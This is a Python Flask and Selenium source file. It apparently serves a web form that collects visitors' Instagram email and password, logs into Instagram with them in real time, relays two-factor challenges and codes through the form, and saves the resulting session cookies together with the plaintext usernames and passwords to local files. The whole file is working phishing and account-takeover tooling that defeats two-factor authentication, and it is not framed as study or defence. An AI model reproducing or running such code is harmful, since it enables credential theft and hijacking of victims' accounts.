from flask import Flask, request, render_template, jsonify, session
from flask_session import Session
import logging
import time
import secrets
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    NoSuchWindowException, TimeoutException, WebDriverException, NoSuchElementException, StaleElementReferenceException
)
from selenium.webdriver.common.action_chains import ActionChains
import json
from pathlib import Path
from waitress import serve
from selenium.webdriver.support import expected_conditions as ec

import logging
import secrets
from flask import Flask, render_template, request, session, jsonify
from custom_webdriver_manager import WebDriverManager

# Config
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)

# Configure session to use filesystem (temporary)
app.config["SECRET_KEY"] = secrets.token_hex(16)
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

# Initialize WebDriver manager
webdriver_manager = WebDriverManager()
driver_timestamps = {}

def website_login(driver, username, password):
    """Log into Instagram using provided username and password."""

    driver_timestamps[session.sid] = time.time()

    try:
        driver.get("https://www.instagram.com/accounts/login/")
        logging.info("Navigated to Instagram login page")

        handle_cookies(driver)
        time.sleep(1)
        input_credentials(driver, username, password)

    except Exception as e:
        logging.error(f"An error occurred during the login process: {e}")

def handle_cookies(driver):
    """Handle cookie acceptance on the login page."""
    try:
        cookie_button = WebDriverWait(driver, 2).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Alle Cookies erlauben')]"))
        )
        cookie_button.click()
        logging.info("Clicked on cookie button")
    except Exception:
        logging.info("Cookie button not found or not clickable")

def input_credentials(driver, username, password):
    """Input login credentials into the Instagram login form."""
    username_field = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, "username"))
    )
    username_field.send_keys(username)
    logging.info("Entered username")

    password_field = driver.find_element(By.NAME, "password")
    password_field.send_keys(password)
    logging.info("Entered password")

def click_login(driver):
    """Click the login button."""
    time.sleep(1)
    try:
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//button[@type='submit']"))
        ).click()
        logging.info("Clicked on login button")
    except StaleElementReferenceException:
        logging.warning("StaleElementReferenceException: Re-locating the login button and attempting to click again.")
        login_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//button[@type='submit']"))
        )
        login_button.click()
        logging.info("Clicked on login button after re-locating")
    except Exception as e:
        logging.error(f"An error occurred while trying to click the login button: {e}")

def find_problem(driver, username_insta, password_insta):
    """Determine the problem based on the current URL."""
    try:
        while driver.current_url.strip() == "about:blank":
            print(
                f"Debug: Current URL is '{driver.current_url}'")  # Debug print to check the URL at this point, including quotes to see spaces
            time.sleep(1)

        # Now wait until the URL changes from the initial one
        initial_url = driver.current_url
        WebDriverWait(driver, 10).until(lambda d: d.current_url != initial_url)

        current_url = driver.current_url
        logging.info(f"Current URL: {current_url}")

        if "/accounts/login/two_factor" in current_url:
            logging.info("Special needs 2FA")
            return 3

        # elif ... ....
        #   return 5 for recaptcha

        elif "challenge" not in current_url:
            logging.info("challenge not in URL, login ok")
            save_cookie(driver, username_insta, password_insta, 1)
            return 1
        elif current_url.startswith("https://www.instagram.com/") and len(current_url) > len(
                "https://www.instagram.com/"):
            logging.info("Redirected to a specific Instagram page.")
            return 0
        else:
            logging.warning(f"Redirected to an unexpected URL: {current_url}")
            return 0
    except TimeoutException:
        logging.error("The page did not redirect within 5 seconds.")
        return 2
    except WebDriverException as e:
        logging.error(f"WebDriverException occurred while checking the problem: {e}")
        raise
    except Exception as e:
        logging.error(f"An unexpected error occurred while checking the problem: {e}")
        raise

def find_problem_no_wt(driver, username_insta, password_insta):
    """Determine the problem based on the current URL."""
    try:
        initial_url = driver.current_url
        WebDriverWait(driver, 5).until(lambda d: d.current_url != initial_url)

        current_url = driver.current_url
        logging.info(f"Current URL: {current_url}")

        if "/accounts/login/two_factor" in current_url:
            logging.info("Special needs 2FA")
            return 3
        elif "challenge" not in current_url:
            logging.info("challenge not in URL, login ok")
            save_cookie(driver, username_insta, password_insta, 1)
            return 1
        elif current_url.startswith("https://www.instagram.com/") and len(current_url) > len(
                "https://www.instagram.com/"):
            logging.info("Redirected to a specific Instagram page.")
            return 0
        else:
            logging.warning(f"Redirected to an unexpected URL: {current_url}")
            return 0
    except TimeoutException:
        logging.error("The page did not redirect.")
        return 2
    except WebDriverException as e:
        logging.error(f"WebDriverException occurred while checking the problem: {e}")
        raise
    except Exception as e:
        logging.error(f"An unexpected error occurred while checking the problem: {e}")
        raise

def teardown():
    pass

def solve_problem(driver):
    """Solve the problem based on current URL."""
    try:
        logging.info("Wie Möchtest du dich Ausweisen?")
        element1 = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, '[for="choice_1"]'))
        )
        element0 = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, '[for="choice_0"]'))
        )

        logging.info(f"{element1.text}\n{element0.text}")
        return element0, element1
    except NoSuchElementException as e:
        logging.error(f"Element not found while solving the problem: {e}")
        raise
    except TimeoutException as e:
        logging.error(f"Timeout occurred while solving the problem: {e}")
        raise
    except WebDriverException as e:
        logging.error(f"WebDriverException occurred while solving the problem: {e}")
        raise
    except Exception as e:
        logging.error(f"An unexpected error occurred while solving the problem: {e}")
        raise


from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from flask import jsonify


def send_code(driver):
    """Send the 2FA code."""
    try:
        wait = WebDriverWait(driver, 10)
        button = wait.until(EC.visibility_of_element_located((By.XPATH, '//div[text()="Sicherheitscode senden"]')))
        ActionChains(driver).move_to_element(button).click(button).perform()
        logging.info("Clicked 2FA-Button")
    except NoSuchWindowException:
        logging.error("The browser window was closed unexpectedly.")
    except TimeoutException:
        logging.error("The code button was not found within the specified timeout period.")
    except WebDriverException as e:
        logging.error(f"WebDriverException occurred while trying to send the code: {e}")
        raise
    except Exception as e:
        logging.error(f"An unexpected error occurred while trying to send the code: {e}")
        raise

def type_code(driver):
    """Type the received 2FA code."""
    try:
        wait = WebDriverWait(driver, 10)
        code_input = wait.until(EC.visibility_of_element_located((By.ID, 'security_code')))

        sc = input("code?")

        # Clean the input to only include numbers
        cleaned_sc = ''.join([char for char in sc if char.isdigit()])

        code_input.send_keys(cleaned_sc)

        button = wait.until(EC.visibility_of_element_located((By.XPATH, '//div[text()="Senden"]')))

        ActionChains(driver).move_to_element(button).click(button).perform()

        WebDriverWait(driver, 5).until(lambda d: d.current_url != driver.current_url)

        current_url = driver.current_url
        logging.info(f"Current URL: {current_url}")

        if "challenge" not in current_url:
            logging.info("Redirected to the main Instagram page. Login OK after 2FA")
        else:
            logging.info("Code Falsch")
            new_code = input("Neuer Code")
            code_input = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.ID, 'security_code')))
            code_input.send_keys(new_code)

    except WebDriverException as e:
        logging.error(f"WebDriverException occurred during the code input: {e}")
        raise
    except Exception as e:
        logging.error(f"An error occurred during the code input: {e}")
        raise

def save_cookie(driver, username_insta, password_insta, quit_state):
    """Save cookies to a file."""
    try:
        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.XPATH, "//button[text()='Informationen speichern']"))
        ).click()
        logging.info("Button found and clicked")
    except Exception as e:
        logging.info("save information button not available")

    cookies = driver.get_cookies()

    # Create the directory for storing cookies if it doesn't exist
    cookies_folder = Path('../cookies')
    cookies_folder.mkdir(exist_ok=True)

    # Determine the next file number based on existing cookie files
    cookie_files = list(cookies_folder.glob('cookies_*.json'))
    next_file_number = len(cookie_files) + 1

    # Save cookies to a JSON file
    cookie_file = cookies_folder / f'cookies_{next_file_number}.json'
    cookie_file.write_text(json.dumps(cookies, indent=2))

    logging.info(f"Cookie created {username_insta} with cookie number {next_file_number}")

    # Append the new username and cookie number to the input.txt file
    input_file = cookies_folder / 'input.txt'
    input_content = f"Cookie Number: {next_file_number}, Used Username: {username_insta}, Password: {password_insta}\n -------------------------------------- \n"

    if input_file.exists():
        with input_file.open('a') as file:
            file.write(input_content)
    else:
        input_file.write_text(input_content)

    logging.info("Updated input.txt file with new cookie number.")
    if quit_state == 1:
        pass
    else:
        pass

def clear_field(driver):
    """Refresh the page."""
    try:
        driver.refresh()
        logging.info("Page refreshed")
    except Exception as e:
        logging.error(f"An error occurred during the refresh: {e}")
        raise


def find_choices(driver):
    """Find and return the choices available for a challenge."""
    try:
        elements = WebDriverWait(driver, 10).until(
            EC.presence_of_all_elements_located((By.CSS_SELECTOR, 'label[for^="choice_"]'))
        )

        choices = [element.text for element in elements]
        return choices
    except Exception as e:
        logging.error(f"An error occurred while finding choices: {e}")
        return []

def send_back(state, username_insta, driver, session_id):
    password_insta = session.get('password')

    """Send the final response back to the client."""
    logging.info(f"Got to send_back with state: {state}")
    if state == 1:
        logging.info("Authentication successful")
        save_cookie(driver, username_insta, password_insta, 1)
        teardown()
        webdriver_manager.remove_driver(session_id)
        return jsonify({'success': True, 'message': 'Verification successful!'}), 200
    elif state == 2:
        logging.info("Password or Email wrong.")
        return jsonify({
            'success': False,
            'message': 'Leider ist dein eingegebenes Passwort oder E-Mail falsch. Bitte überprüfe es noch einmal.'}), 401
    elif state == 3:
        return jsonify({'success': False,
                        'message': 'Gib einen 6-stelligen Code ein, der von einer Authentifizierungs-App erstellt wurde.',
                        'require_2fa': True}), 200
    else:
        try:
            wblocks = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'div[data-bloks-name="bk.components.Flexbox"] span:nth-of-type(2)'))
            )
            print(wblocks.text)
            return jsonify({
                'success': False,
                'message': 'Bitte wähle eine der folgenden Optionen.',
                'options': [wblocks.text],  # Ensure it's a list to be handled by JS
                'require_2fa_choices': True
            }), 200
        except:
            choices = find_choices(driver)
            print(choices)
            return jsonify({
                'success': False,
                'message': 'Bitte wähle eine der folgenden Optionen.',
                'options': choices,
                'require_2fa_choices': True
            }), 200


def enter_verification_code(driver, code):
    """Enter the verification code for 2FA."""
    try:
        input_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "verificationCode"))
        )
        input_field.clear()
        input_field.send_keys(code)
        logging.info("Entered verification code.")

        confirm_button = WebDriverWait(driver, 2).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Bestätigen')]"))
        )
        confirm_button.click()
        logging.info("Clicked the confirmation button.")
    except (TimeoutException, NoSuchElementException) as e:
        logging.error(f"Error in entering verification code: {e}")

def special_needs_fa(driver, code):
    """Handle special needs for 2FA."""
    initial_url_fa = driver.current_url
    enter_verification_code(driver, code)

    try:
        WebDriverWait(driver,12).until(lambda d: d.current_url != initial_url_fa) #issue Website taking too long to update
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, "//button[text()='Informationen speichern']"))
        ).click()
        logging.info("Button found and clicked")
        return True
    except TimeoutException:
        logging.error("The page did not redirect within 5 seconds after 2FA step or button not found.")
        return False

def click_im_no_robot(driver):
    captcha_iframe = WebDriverWait(driver, 10).until(
        ec.presence_of_element_located(
            (
                By.TAG_NAME, 'iframe'
            )
        )
    )

    ActionChains(driver).move_to_element(captcha_iframe).click().perform()

    # click im not robot
    captcha_box = WebDriverWait(driver, 10).until(
        ec.presence_of_element_located(
            (
                By.ID, 'g-recaptcha-response'
            )
        )
    )

    driver.execute_script("arguments[0].click()", captcha_box)

    try:
        weiter_button = WebDriverWait(driver, 1).until(
            EC.presence_of_element_located((By.XPATH, "//div[@role='button' and @tabindex='0' and text()='Weiter']"))
        )
        weiter_button.click()

    except TimeoutException:
        logging.error("Weiter Button not found")


def input_code_choices(driver, code):
    cleaned_code = ''.join([char for char in code if char.isdigit()])
    clear_field(driver)
    try:
        #clear_field(driver)

        # Wait for the input field and enter the code
        code_input = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='number']"))
        )
        code_input.send_keys(cleaned_code)
        logging.info("Code entered successfully")

        initial_url_fa = driver.current_url

        try:

            logging.info("Try to click senden...")

            # Wait for and click the 'Bestätigen' button using data-testid
            code_button = WebDriverWait(driver, 4).until(
                EC.presence_of_element_located(
                    (By.XPATH, "//div[@role='button' and @tabindex='0']"))
            )
            logging.info("Found 'Bestätigen' button")

            # Attempt to click the button
            code_button.click()
            logging.info("Clicked on 'Bestätigen' button")

            # Wait for the URL to change
            WebDriverWait(driver, 4).until(lambda d: d.current_url != initial_url_fa)
            logging.info("URL changed after clicking 'Bestätigen'")

            # Wait for and click the 'Informationen speichern' button
            save_button = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, "//button[text()='Informationen speichern']"))
            )
            save_button.click()
            logging.info("Clicked on 'Informationen speichern' button")

            return True

        except TimeoutException:
            logging.error("The page did not redirect within 10 seconds after 2FA step or button not found.")
            return False

    except TimeoutException:
        logging.error("The input field for the code was not found within 10 seconds.")
        try:

            button_code = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, "security_code")))
            button_code.click()
            button_code.send_keys(cleaned_code)

            logging.error("Code entered successfully on the second attempt")

            initial_url_fa = driver.current_url

            try:
                logging.info("2 Attempt now")
                # Wait for and click the 'Bestätigen' button using data-testid
                code_button = WebDriverWait(driver, 4).until(
                    EC.presence_of_element_located((By.XPATH, "//div[@role='button' and @tabindex='0']"))
                )
                logging.info("Found 'Bestätigen' button")

                # Attempt to click the button
                code_button.click()
                logging.info("Clicked on 'Bestätigen' button")

                # Wait for the URL to change
                WebDriverWait(driver, 7).until(lambda d: d.current_url != initial_url_fa)
                logging.info("URL changed after clicking 'Bestätigen'")

                try:
                    # Wait for and click the 'Informationen speichern' button
                    save_button = WebDriverWait(driver, 7).until(
                        EC.element_to_be_clickable((By.XPATH, "//button[text()='Informationen speichern']"))
                    )
                    save_button.click()
                    logging.info("Clicked on 'Informationen speichern' button")

                except TimeoutException:
                    logging.error("infomationen Speichern nicht gefunden")

                    return True



                return True

            except TimeoutException:
                logging.error("The page did not redirect within 10 seconds after 2FA step or button not found.")
                return False

        except TimeoutException:
            logging.error("Input field for security code was not found.")
            return False




@app.route('/')
def form():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        username_insta = request.form['email']
        password_insta = request.form['password']

        session_id = session.sid

        session['email'] = username_insta
        session['password'] = password_insta

        driver = webdriver_manager.create_driver(session_id)

        website_login(driver, username_insta, password_insta)
        click_login(driver)
        login_stage = find_problem(driver, username_insta, password_insta)

        if login_stage == 1:
            logging.info("Login OK, no 2FA needed")
            logging.info("Calling send_back")
            result = send_back(1, username_insta, driver, session_id)
            print(result)
            logging.info("send_back called")
            #save_cookie(driver, username_insta, password_insta, 1)
            return result


        elif login_stage == 2:
            logging.info("Password or Email wrong.")
            clear_field(driver)
            return send_back(2, username_insta, driver, session_id)
        elif login_stage == 3:
            logging.info("Starting special needs 2FA")
            return send_back(3, username_insta, driver, session_id)

        elif login_stage == 5:
            logging.info("recaptcha has to be done")
            return send_back(5, username_insta, driver, session_id)

        else:
            logging.info("2FA Required. Finding choices...")
            return send_back(4, username_insta, driver, session_id)

    except Exception as e:
        app.logger.error(f"An error occurred: {str(e)}")
        logging.error(f"Error in processing: {e}")
        cleanup_driver(session.sid)
        return False

@app.route('/2fa', methods=['POST'])
def two_factor_auth():
    code = request.form['code']

    session_id = session.sid

    driver = webdriver_manager.get_driver(session_id)

    if special_needs_fa(driver, code):
        username_insta = session.get('email')
        password_insta = session.get('password')
        save_cookie(driver, username_insta, password_insta, 1)
        #driver.quit()
        return jsonify({'success': True, 'message': '2FA verification successful!'}), 200
    else:
        return jsonify({'success': False, 'message': 'Invalid 2FA code, please try again.'}), 401

    cleanup_driver(session.sid)

@app.route('/get-2fa-choices', methods=['POST'])
def get_2fa_choices():
    try:
        chosen_choice = request.form['choice']
        print(f"Chosen choice: {chosen_choice}")
        session_id = session.sid
        driver = webdriver_manager.get_driver(session_id)

        # Wait for the chosen button and click it
        try:
            chosen_button = WebDriverWait(driver, 1).until(
                EC.presence_of_element_located((By.XPATH, f"//span[text()='{chosen_choice}']"))
            )
            driver.execute_script("arguments[0].click();", chosen_button)
        except TimeoutException:
            logging.error(f"Button for choice '{chosen_choice}' not found or not clickable")
            try:
                weiter_button = WebDriverWait(driver, 1).until(
                    EC.presence_of_element_located((By.XPATH, "//div[@role='button' and @tabindex='0' and text()='Weiter']"))
                )
                weiter_button.click()

            except TimeoutException:
                logging.error("Weiter Button not found")
                return jsonify({'success': False, 'message': 'Weiterbutton not found'}), 404


            #return jsonify({'success': False, 'message': 'Choice button not found'}), 404

        # Wait for the send confirmation button and click it
        try:
            send_code_button = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.XPATH, "//span[text()='Bestätigungscode senden']"))
            )
            driver.execute_script("arguments[0].click();", send_code_button)
            print("Clicked 'Bestätigungscode senden' button")
        except TimeoutException:
            logging.error("'Bestätigungscode senden' button not found or not clickable")
            #return jsonify({'success': False, 'message': 'Confirmation button not found'}), 404
            return jsonify({'success': True, 'message': f'Choice {chosen_choice} received and confirmation sent.'}), 200

        return jsonify({'success': True, 'message': f'Choice {chosen_choice} received and confirmation sent.'}), 200

    except Exception as e:
        logging.error(f"An unexpected error occurred: {str(e)}")
        return jsonify({'success': False, 'message': 'An unexpected error occurred'}), 500
        cleanup_driver(session.sid)




@app.route('/verify-code', methods=['POST'])
def verify_code():

    code = request.form['code']
    session_id = session.sid

    driver = webdriver_manager.get_driver(session_id)

    logging.info(f"Input received {code}.")
    password_insta = session.get('password')
    username_insta = session.get('email')
    # Your verification logic here
    if input_code_choices(driver, code):  # You'll need to implement this function
        print("LogInNGINGINGINGIGNgin")

        save_cookie(driver, username_insta, password_insta, 1)
        teardown()
        webdriver_manager.remove_driver(session_id)
        return jsonify({'success': True, 'message': 'Verification successful!'}), 200
    else:
        return jsonify({'success': False, 'message': 'Invalid verification code, please try again.'}), 401

    cleanup_driver(session.sid)

def cleanup_driver(session_id):
    """Cleans up the driver and removes it from the manager and timestamps."""
    try:
        webdriver_manager.remove_driver(session_id)
        if session_id in driver_timestamps:
            del driver_timestamps[session_id]
        logging.info(f"Driver for session {session_id} cleaned up.")
    except Exception as e:
        logging.error(f"Error during driver cleanup for session {session_id}: {e}")


def check_and_close_drivers():
    """Periodically checks and closes idle drivers."""
    while True:
        current_time = time.time()
        for session_id, timestamp in list(driver_timestamps.items()):  # Iterate over a copy
            if current_time - timestamp > 300:  # 5 minutes (300 seconds)
                cleanup_driver(session_id)
                session.pop(session_id, None)  # Clear session data if needed


        time.sleep(60)  # Check every minute



# Start the driver cleanup thread
import threading
cleanup_thread = threading.Thread(target=check_and_close_drivers, daemon=True)
cleanup_thread.start()




if __name__ == '__main__':
    serve(app, host='0.0.0.0', port=5001)
